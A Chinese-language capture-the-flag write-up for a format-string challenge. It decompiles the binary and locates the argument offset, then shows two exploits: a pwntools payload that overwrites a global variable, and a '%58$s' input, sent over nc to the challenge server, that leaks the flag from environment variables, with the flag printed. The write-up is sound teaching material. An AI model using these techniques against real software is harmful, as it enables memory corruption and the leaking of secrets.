# 【中等】魔法禁书目录

> hint：什么格式化字符串可以[覆盖内存](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_8)？如果你觉得手动构造太复杂，pwntools 或许可以助你一臂之力。

> 非预期？！：出题人打开程序一看，这个是什么？一顿操作后，他发现一个似乎是非预期。什么？非预期？但是这个也是格式化字符串，怎么可以叫非预期呢？（嘴硬）如果你想知道是什么，不妨看看这个：[泄露内存](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_3)。

# 题目分析

一样，放入 IDA 分析一下:
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-68h]
  char buf[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v6; // [rsp+68h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  ancient_power = rand();
  printf("tell me your name: ");
  read(0, buf, 0x50uLL);
  printf("your name is ");
  printf(buf);
  if ( ancient_power == 1131796 )
  {
    v4 = getenv("FLAG");
    printf("\nThe mystical power has been revealed: %s\n", v4);
  }
  else
  {
    puts("\nThe mystical power remains hidden...");
  }
  return 0;
}
```

很简单，如果 ancient_power 这个全局遍历器变量的值为 **1131796 (0x114514)** 就会打印 FLAG，否则就打印 The mystical power remains hidden...

用 IDA 也可以得到 ancient_power 的地址（没有开PIE）:
``` C
.bss:000000000040404C                 public ancient_power
.bss:000000000040404C ancient_power   dd ?                    ; DATA XREF: main+7A↑w
.bss:000000000040404C                                         ; main+CF↑r
.bss:000000000040404C _bss            ends
```

对于格式化字符串的偏移嘛，有一个很好用的工具：[Pwngdb](https://github.com/scwuaptx/Pwngdb.git) 可以用他的 `fmtarg` 进行偏移的计算。

把程序运行到 printf 处（未执行），然后求 rdi 所在的偏移：
``` C
00:0000│ rsp 0x7fffffffd6d0 ◂— 0
01:0008│-068 0x7fffffffd6d8 ◂— 0
02:0010│ rsi 0x7fffffffd6e0 ◂— 0xa7025 /* '%p\n' */
03:0018│-058 0x7fffffffd6e8 ◂— 0
```
``` C
pwndbg> fmtarg 0x7fffffffd6e0
The index of format argument : 8 (\"\%7$p\")
```

上面的 8 就是我们需要的偏移。

# exp

1. 方法一：覆盖内存：

小 tip : fmtstr_payload使用要指定架构，arch='amd64'。
``` python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

# p = remote('202.199.6.66', 35977)
p = process('./ancient_book')

# 方法一：格式化字符串进行内存覆盖
ancient_power_addr = 0x40404C
payload = fmtstr_payload(8, {ancient_power_addr: 0x114514})
p.sendline(payload)
```

2. 方法二：泄露内存

由于程序把 flag 放入了环境变量中，我们可以通过用 fmt 泄露环境变量。

``` python
# 直接用 %s 泄露
# 这个是因为 flag 在环境变量中，所以直接用 %s 泄露
# 调试发现 %57$s 开始泄露环境变量，用 %58$s 就可以泄露 flag
# 33:0198│ r13 0x7fffffffd918 —▸ 0x7fffffffdc0c ◂— 'SHELL=/bin/bash'
# pwndbg> fmtarg 0x7fffffffd918
# The index of format argument : 57 (\"\%56$p\")
```

接下来 nc 连接，再输入 `%58$s` 即可获得 flag。 
``` Bash
┌──(kali㉿LAPTOP-9O25NAN3)-[~/Desktop/nex_practice/fmt]
└─$ nc 202.199.6.66 39427
tell me your name: %58$s
your name is FLAG=nex{I0rM475TRiN9S_rEvEA1_aNclenT_pOW3R5-n2p59hn7}

The mystical power remains hidden...
```